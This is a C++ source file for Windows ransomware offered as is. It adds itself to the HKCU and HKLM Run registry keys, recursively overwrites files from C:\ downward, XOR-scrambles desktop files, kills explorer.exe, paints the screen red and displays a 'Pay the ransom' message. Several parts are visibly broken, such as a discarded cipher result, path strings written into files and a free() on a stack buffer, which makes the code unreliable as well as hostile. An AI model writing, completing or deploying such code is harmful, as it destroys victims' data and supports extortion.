#include <iostream>
#include <windows.h>
#include <string>
#include <atlstr.h>
#include <fstream>
#include <shlobj.h>
#include <vector>
using namespace std;
void writeToFile(string name, string encrypted_string)
{
	FILE* file;

	file = fopen(name.c_str(), "w");

	//Write encryptedString to file
	fprintf(file, "%s", encrypted_string.c_str());

	fclose(file);
}

//For reading/writing a file 
#define FILE_ATTRIBUTE_GENERIC_READ    (STANDARD_RIGHTS_READ     |\
                                       FILE_READ_DATA           |\
                                       FILE_READ_ATTRIBUTES     |\
                                       FILE_READ_EA             |\
                                       SYNCHRONIZE)
string encryptCode(string str)
{
	string res;

	// Performing XOR operation 
	for (int i = 1; i < str.length(); i++)
		res += (char)(str[i - 1] ^ str[i]);

	// Appending first character 
	res += str[0];

	return res;
}
string encrypt(string plain)
{
	//Generate a random 256-bit key
	vector <int> key;
	int keylength = 256;
	srand(time(NULL));
	for (int i = 0; i < keylength; i++)
	{
		key.push_back(rand());
	}

	string cipher = "";

	//Perform one-time pad style XOR 
	for (int i = 0; i < plain.length(); i++)
	{
		int k = key[i % keylength];
		int x = plain[i] ^ k;
		cipher += char(x);
	}

	return cipher;
}
//A secure encryption algorithm can be used here
//A random AlphaNumeric code is generated
string generateCode()
{
	char code[16];

	srand(time(NULL));

	for (int i = 0; i < 16; i++)
	{
		code[i] = rand() % 74 + 48; //Generating random character
	}
	//Encrypt code using encryption algorithm
	string encrypted_code = encryptCode(code);
	return encrypted_code;
}

//This will make registry entries in registry
void addRegistryEntries(string path, string code)
{
	// Creating new registry entry
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, "Ransomware", 0, REG_SZ, (const BYTE*)path.c_str(), path.size());
	// Creating the Encoded code entry
	RegSetValueEx(hKey, "Code", 0, REG_SZ, (const BYTE*)code.c_str(), code.size());
	RegCloseKey(hKey);
}

//Encryption function for encrypting strings
string encryptString(string str)
{
	//Encrypt each character in string
	for (int i = 0; i < str.length(); i++)
	{
		int code = (int)str[i];
		code = code + 5;
		str[i] = (char)code;
	}

	//Encrypt the whole string using encryption algorithm
	string encrypted_str = encryptCode(str);
	return encrypted_str;
}

void encryptFiles(string path)
{
	WIN32_FIND_DATA FileData;
	HANDLE hFind;
	string mask = path + "\\*";
	hFind = FindFirstFile(mask.c_str(), &FileData);
	if (hFind == INVALID_HANDLE_VALUE) return;

	do
	{
		string fName = FileData.cFileName;
		if (fName != "." && fName != "..")
		{
			string fullPath = path + "\\" + fName;

			//skip hidden files
			if (FileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
			{
				continue;
			}

			if (FileData.dwFileAttributes == (FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_GENERIC_READ))
			{
				//Encrypt strings in file
				string encrypted_string = encryptString(fullPath);

				//Write encrypted string to file
				writeToFile(fullPath, encrypted_string);
			}
			else
			{
				//Encrypt file using encryption algorithm
				encrypt(fullPath);
			}
		}
	} while (FindNextFile(hFind, &FileData));

	FindClose(hFind);

	//Recurse through directories
	string submask = path + "\\*";
	hFind = FindFirstFile(submask.c_str(), &FileData);
	if (hFind == INVALID_HANDLE_VALUE) return;
	do {
		string fName = FileData.cFileName;
		if (fName != "." && fName != "..")
		{
			string fullPath = path + "\\" + fName;

			//skip hidden files
			if (FileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)
			{
				continue;
			}

			//Recurse through subdirectories
			if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				encryptFiles(fullPath);
			}
		}
	} while (FindNextFile(hFind, &FileData));
	FindClose(hFind);
}


int main()
{

	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
	HKEY hkey = NULL;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
	unsigned int commandLen = strlen(GetCommandLine()) + 3;
	char* command = (char*)malloc(commandLen);
	strcpy(command, "\"");
	strcat(command, GetCommandLine());
	strcat(command, "\"");
	RegSetValueEx(hkey, "Ransomware", 0, REG_SZ, (LPBYTE)command, commandLen);
	RegCloseKey(hkey);
	free(command);

	//Add registry key to open ransomware on system startup
	HKEY hkey2 = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey2);
	unsigned int commandLen2 = strlen(GetCommandLine()) + 3;
	char* command2 = (char*)malloc(commandLen2);
	strcpy(command2, "\"");
	strcat(command2, GetCommandLine());
	strcat(command2, "\"");
	RegSetValueEx(hkey2, "Ransomware", 0, REG_SZ, (LPBYTE)command2, commandLen2);
	RegCloseKey(hkey);
	free(command2);

	char path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);
	string code = generateCode();
	addRegistryEntries(path, code);
	encryptFiles("C:\\");
	char root[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, root);
	unsigned int pathLen = strlen(root) + 2;
	strcpy(path, root);
	strcat(path, "\\*");
	WIN32_FIND_DATA fd;
	HANDLE hFind = FindFirstFile(path, &fd);
	do {
		if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			//Encrypt the file
			unsigned int fileNameLen = strlen(fd.cFileName) + 1;
			char* fileName = (char*)malloc(fileNameLen);
			strcpy(fileName, fd.cFileName);
			unsigned int filePathLen = strlen(root) + fileNameLen + 1;
			char* filePath = (char*)malloc(filePathLen);
			strcpy(filePath, root);
			strcat(filePath, "\\");
			strcat(filePath, fileName);
			FILE* inFile = fopen(filePath, "rb");
			if (inFile == NULL) {
				printf("Can't open file!");
				exit(1);
			}
			fseek(inFile, 0, SEEK_END);
			unsigned int size = ftell(inFile);
			rewind(inFile);
			char* content = (char*)malloc(size);
			fread(content, sizeof(char), size, inFile);
			fclose(inFile);

			//Encryption logic
			//Encrypt the content of the file
			for (int i = 0; i < size; i++) {
				content[i] = content[i] ^ 0x50;
			}

			//Write the encrypted content back to the file
			FILE* outFile = fopen(filePath, "wb");
			if (outFile == NULL) {
				printf("Can't open file!");
				exit(1);
			}
			fwrite(content, sizeof(char), size, outFile);
			fclose(outFile);
			free(fileName);
			free(filePath);
			free(content);
		}
	} while (FindNextFile(hFind, &fd));
	FindClose(hFind);
	free(path);


	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
		AdjustTokenPrivileges(hToken, false, &tp, 0, NULL, NULL);
		CloseHandle(hToken);
	}


	system("taskkill /f /im explorer.exe");


	//Make desktop red
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetDC(hwnd);
	RECT rect;
	GetWindowRect(hwnd, &rect);
	int width = rect.right;
	int height = rect.bottom;
	HBRUSH brush = CreateSolidBrush(RGB(255, 0, 0));
	SelectObject(hdc, brush);
	Rectangle(hdc, 0, 0, width, height);
	ReleaseDC(hwnd, hdc);
	DeleteObject(brush);

	//Show ransom note
	HWND ransomNote = CreateWindowEx(0, "STATIC", "Your files have been encrypted! \nPay the ransom to get the decryption key!",
		WS_CHILD | WS_VISIBLE | SS_CENTER,
		(width / 2) - 150, (height / 2) - 25, 300, 50, NULL, NULL, NULL, NULL);
	ShowWindow(ransomNote, SW_SHOW);
	//Block user input
	SetWindowLongPtr(ransomNote, GWL_EXSTYLE, GetWindowLongPtr(ransomNote, GWL_EXSTYLE) | WS_EX_TRANSPARENT);

	//Wait for ransom to be paid
	while (1) {
		Sleep(1000);
	}


	std::cin.ignore();
	std::cin.ignore();

}
